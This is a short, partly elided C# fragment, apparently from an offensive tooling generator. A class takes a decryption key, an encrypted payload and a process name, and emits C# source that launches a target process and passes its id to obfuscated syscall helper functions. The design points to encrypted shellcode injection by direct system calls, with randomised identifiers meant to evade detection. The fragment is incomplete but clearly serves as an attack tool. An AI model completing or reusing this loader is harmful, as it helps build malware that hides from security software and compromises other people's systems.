...
{
    class TP_Syscall_New
    {
        string code;

        public TP_Syscall_New(String decKey, String encPayload, string proc_name)
        {
            code = @"using System;
...
namespace CS_SysCall
{
    class Program
    {
        ...
        static unsafe void Main(string[] args)
        {
            ...
            p.StartInfo = new ProcessStartInfo("""+ proc_name +@""");
            ...
            yr_var_foobar_2_ccx(osV, OPENSEC, p.Id, yr_var_foobar_3_ccx);
